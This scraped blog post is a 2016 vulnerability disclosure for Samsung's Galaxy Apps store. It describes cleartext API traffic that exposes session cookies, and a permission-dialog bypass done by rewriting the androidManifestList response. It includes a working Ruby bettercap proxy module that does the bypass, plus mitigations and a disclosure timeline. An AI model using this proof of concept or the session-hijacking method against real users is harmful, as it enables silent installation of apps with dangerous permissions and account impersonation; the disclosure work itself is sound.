{
  "Source": "www.evilsocket.net",
  "Title": "Samsung Galaxy Apps MITM Vulnerabilities",
  "Link": "https://www.evilsocket.net/2016/08/17/Samsung-Galaxy-Apps-MITM-Vulnerabilities/",
  "Content": "\u003cdiv class=\"content\" itemprop=\"articleBody\"\u003e\n\u003cp\u003eThe Samsung “Galaxy Apps” application installed on every recent Samsung device, a parallel store application with both apps for Samsung smartphones and smart watches, is vulnerable to MITM attacks which could cause user information leaks, permissions dialog bypass and session hijacking.\u003c/p\u003e\n\u003ch4 id=\"Affected-Products\"\u003e\u003ca href=\"#Affected-Products\" class=\"headerlink\" title=\"Affected Products\"\u003e\u003c/a\u003eAffected Products\u003c/h4\u003e\u003cp\u003eSamsung Galaxy Apps \u0026lt;= 4.1.01-14\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/images/2016/08/galaxyapps.png\" alt=\"galaxy apps\"/\u003e\u003c/p\u003e\n\u003cspan id=\"more\"\u003e\u003c/span\u003e\n\u003cp\u003e## MITM, Information Leaks and Session Hijacking\u003c/p\u003e\n\u003ch4 id=\"Summary\"\u003e\u003ca href=\"#Summary\" class=\"headerlink\" title=\"Summary\"\u003e\u003c/a\u003eSummary\u003c/h4\u003e\u003cp\u003eMost of the application API requests are made through a unsafe HTTP connection which would allow a malicious third party to perform a network MITM attack and eventually exfiltrate user sensitive data such as his session identifier and subsequently use this data to impersonate the user session.\u003c/p\u003e\n\u003ch4 id=\"Details\"\u003e\u003ca href=\"#Details\" class=\"headerlink\" title=\"Details\"\u003e\u003c/a\u003eDetails\u003c/h4\u003e\u003cp\u003eThe application relies on a XML based API used through HTTP, as soon as the user will open the app and start browsing a network attacker will be able to see requests sent to the API server and the user session data, for instance the first request being executed when the user clicks on an application detail page, identified by the name \u003cstrong\u003eproductDetailOverview\u003c/strong\u003e is composed as shown in the following picture.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/images/2016/08/productDetailOverview.png\" alt=\"galaxy apps\"/\u003e\u003c/p\u003e\n\u003cp\u003eThe XML response will contain application data such as the creation date, last update date, product name and description, etc.\u003c/p\u003e\n\u003cp\u003eIt is possible to see that the user session cookies ( \u003cstrong\u003eUUID\u003c/strong\u003e and \u003cstrong\u003eJSESSIONID\u003c/strong\u003e ) are sent in cleartext, therefore they can be used by an attacker to impersonate the user and perform API requests on his behalf.\u003c/p\u003e\n\u003cp\u003eOther XML request names sent during application browsing and installation are:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003ebigBannerList\u003c/strong\u003e, used to obtain application preview images.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eexpertCommentList\u003c/strong\u003e and commentList, these fetch comments for an app.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eproductDetailRelated\u003c/strong\u003e, fetches related applications list.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ecategoryProductList2Notc\u003c/strong\u003e, fetches products in the same category.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003esellerProductList2Notc\u003c/strong\u003e, fetches other products of the same vendor.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eandroidManifestList\u003c/strong\u003e, fetches the list of permissions required by the application before installing it ( more on this later ).\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"Impact\"\u003e\u003ca href=\"#Impact\" class=\"headerlink\" title=\"Impact\"\u003e\u003c/a\u003eImpact\u003c/h4\u003e\u003cul\u003e\n\u003cli\u003eUser Impersonation - An attacker could use the exfiltrated session data to authenticate against the API server on the user’s behalf.\u003c/li\u003e\n\u003cli\u003eContents Manipulation - With a transparent proxy and proper redirection rules, an attacker could intercept and modify the XML responses before they’re received by the application, this would allow him to replace product images, names and descriptions with fake ones.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"Permissions-Dialog-Bypass\"\u003e\u003ca href=\"#Permissions-Dialog-Bypass\" class=\"headerlink\" title=\"Permissions Dialog Bypass\"\u003e\u003c/a\u003ePermissions Dialog Bypass\u003c/h2\u003e\u003ch4 id=\"Summary-1\"\u003e\u003ca href=\"#Summary-1\" class=\"headerlink\" title=\"Summary\"\u003e\u003c/a\u003eSummary\u003c/h4\u003e\u003cp\u003eIt is possible for an attacker performing a MITM network attack to intercept and modify the XML response of the \u003cstrong\u003eandroidManifestList\u003c/strong\u003e request and force the product to install an application without showing to the user the permission list dialog which would require his approval.\u003c/p\u003e\n\u003ch4 id=\"Details-1\"\u003e\u003ca href=\"#Details-1\" class=\"headerlink\" title=\"Details\"\u003e\u003c/a\u003eDetails\u003c/h4\u003e\u003cp\u003eOnce the user clicks on the “Install” button, an \u003cstrong\u003eandroidManifestList\u003c/strong\u003e request is sent to the API endpoint in order to fetch the list of permissions that the application requires:\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/images/2016/08/androidManifestList.png\" alt=\"galaxy apps\"/\u003e\u003c/p\u003e\n\u003cp\u003eAs shown in this picture, the response will contain the list of permissions separated by a double pipe ( “||” ) token.\u003c/p\u003e\n\u003cp\u003eThis list is then splitted by the application and the user is prompted with a dialog which shows him the required permissions, the installation process requires the user to accept all of them in order to successfully continue.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/images/2016/08/mail.png\" alt=\"galaxy apps\"/\u003e\u003c/p\u003e\n\u003cp\u003eAn attacker performing a MITM network attack can intercept and modify the XML response for this API before it’s sent to the device and replace the permissions list with a single \u003cstrong\u003eINTERNET\u003c/strong\u003e permission entry, in this case the Samsung Galaxy Apps store will directly install the application without showing the user any dialog at all.\u003c/p\u003e\n\u003cp\u003eThe following is a POC bettercap proxy module.\u003c/p\u003e\n\u003cfigure class=\"highlight ruby\"\u003e\u003ctable\u003e\u003ctbody\u003e\u003ctr\u003e\u003ctd class=\"gutter\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003e1\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e2\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e3\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e4\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e5\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e6\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e7\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e8\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e9\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e10\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e11\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e12\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e13\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e14\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e15\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e16\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e17\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e18\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e19\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e20\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e21\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e22\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e23\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e24\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e25\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e26\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e27\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e28\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e29\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e30\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e31\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e32\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e33\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e34\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e35\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e36\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003ctd class=\"code\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e=begin\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003eBETTERCAP\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003eAuthor : Simone \u0026#39;evilsocket\u0026#39; Margaritelli\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003eEmail  : evilsocket\u003cspan class=\"doctag\"\u003e@gmail\u003c/span\u003e.com\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003eBlog   : http://www.evilsocket.net/\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003eThis project is released under the GPL 3 license.\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e=end\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"class\"\u003e\u003cspan class=\"keyword\"\u003eclass\u003c/span\u003e \u003cspan class=\"title\"\u003eGalaxyApps\u003c/span\u003e \u0026lt; BetterCap::Proxy::\u003cspan class=\"title\"\u003eHTTP::Module\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e  meta(\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    \u003cspan class=\"string\"\u003e\u0026#39;Name\u0026#39;\u003c/span\u003e        =\u0026gt; \u003cspan class=\"string\"\u003e\u0026#39;GalaxyApps\u0026#39;\u003c/span\u003e,\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    \u003cspan class=\"string\"\u003e\u0026#39;Description\u0026#39;\u003c/span\u003e =\u0026gt; \u003cspan class=\"string\"\u003e\u0026#39;Bypass permission dialog for \u0026#34;Galaxy Apps\u0026#34; application on every Samsung device.\u0026#39;\u003c/span\u003e,\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    \u003cspan class=\"string\"\u003e\u0026#39;Version\u0026#39;\u003c/span\u003e     =\u0026gt; \u003cspan class=\"string\"\u003e\u0026#39;1.0.0\u0026#39;\u003c/span\u003e,\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    \u003cspan class=\"string\"\u003e\u0026#39;Author\u0026#39;\u003c/span\u003e      =\u0026gt; \u003cspan class=\"string\"\u003e\u0026#34;Simone \u0026#39;evilsocket\u0026#39; Margaritelli\u0026#34;\u003c/span\u003e,\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    \u003cspan class=\"string\"\u003e\u0026#39;License\u0026#39;\u003c/span\u003e     =\u0026gt; \u003cspan class=\"string\"\u003e\u0026#39;GPL3\u0026#39;\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e  )\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e  \u003cspan class=\"function\"\u003e\u003cspan class=\"keyword\"\u003edef\u003c/span\u003e \u003cspan class=\"title\"\u003eon_request\u003c/span\u003e\u003cspan class=\"params\"\u003e( request, response )\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    \u003cspan class=\"keyword\"\u003eif\u003c/span\u003e !request.body.\u003cspan class=\"literal\"\u003enil\u003c/span\u003e? \u003cspan class=\"keyword\"\u003eand\u003c/span\u003e request.body.\u003cspan class=\"keyword\"\u003einclude\u003c/span\u003e?(\u003cspan class=\"string\"\u003e\u0026#39;\u0026lt;SamsungProtocol\u0026#39;\u003c/span\u003e)\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e      req_name = \u003cspan class=\"string\"\u003e\u0026#39;???\u0026#39;\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e      \u003cspan class=\"keyword\"\u003eif\u003c/span\u003e request.body =~ \u003cspan class=\"regexp\"\u003e/.+\u0026lt;request\\s+name=\u0026#34;([^\u0026#34;]+)\u0026#34;/i\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        req_name = $\u003cspan class=\"number\"\u003e1\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e      \u003cspan class=\"keyword\"\u003eend\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e      BetterCap::Logger.info \u003cspan class=\"string\"\u003e\u0026#34;[\u003cspan class=\"subst\"\u003e#{\u003cspan class=\"string\"\u003e\u0026#39;GALAXY APPS\u0026#39;\u003c/span\u003e.green}\u003c/span\u003e] Detected Galaxy Apps traffic: \u003cspan class=\"subst\"\u003e#{\u003cspan class=\"string\"\u003e\u0026#39;request\u0026#39;\u003c/span\u003e.blue}\u003c/span\u003e=\u0026#39;\u003cspan class=\"subst\"\u003e#{req_name.yellow}\u003c/span\u003e\u0026#39;\u0026#34;\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e      \u003cspan class=\"keyword\"\u003eif\u003c/span\u003e req_name == \u003cspan class=\"string\"\u003e\u0026#39;androidManifestList\u0026#39;\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        response.body.gsub!( \u003cspan class=\"regexp\"\u003e/permission\u0026#34;\u0026gt;[^\u0026lt;]+\u0026lt;/i\u003c/span\u003e, \u003cspan class=\"string\"\u003e\u0026#39;permission\u0026#34;\u0026gt;INTERNET\u0026lt;\u0026#39;\u003c/span\u003e )\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e      \u003cspan class=\"keyword\"\u003eend\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    \u003cspan class=\"keyword\"\u003eend\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e  \u003cspan class=\"keyword\"\u003eend\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"keyword\"\u003eend\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/tbody\u003e\u003c/table\u003e\u003c/figure\u003e\n\u003ch4 id=\"Impact-1\"\u003e\u003ca href=\"#Impact-1\" class=\"headerlink\" title=\"Impact\"\u003e\u003c/a\u003eImpact\u003c/h4\u003e\u003cp\u003eAn attacker could trick the user to think that an application which requires sensitive permissions does not require any at all, thus forcing the store to install it without any kind of user manual approval.\u003c/p\u003e\n\u003ch4 id=\"Mitigations-amp-Recommendations\"\u003e\u003ca href=\"#Mitigations-amp-Recommendations\" class=\"headerlink\" title=\"Mitigations \u0026amp; Recommendations\"\u003e\u003c/a\u003eMitigations \u0026amp; Recommendations\u003c/h4\u003e\u003cul\u003e\n\u003cli\u003eUse HTTPS connections for every API request.\u003c/li\u003e\n\u003cli\u003eImplement SSL key pinning to avoid SSL MITM attacks.\u003c/li\u003e\n\u003cli\u003eDouble check the list of permissions after the application is downloaded reading them directly from its AndroidManifest.xml file.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"Disclosure-Timeline\"\u003e\u003ca href=\"#Disclosure-Timeline\" class=\"headerlink\" title=\"Disclosure Timeline\"\u003e\u003c/a\u003eDisclosure Timeline\u003c/h4\u003e\u003cul\u003e\n\u003cli\u003eMay 2 2016 : Initial disclosure.\u003c/li\u003e\n\u003cli\u003eJune 7 2016 : Follow up.\u003c/li\u003e\n\u003cli\u003eJune 8 2016 : Email from vendor working on fixes.\u003c/li\u003e\n\u003cli\u003eJune 9 2016 : Confirmation that fixes were going to be pushed in next release\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/div\u003e",
  "Date": "2016-08-17T10:01:42Z",
  "Author": "Simone Margaritelli"
}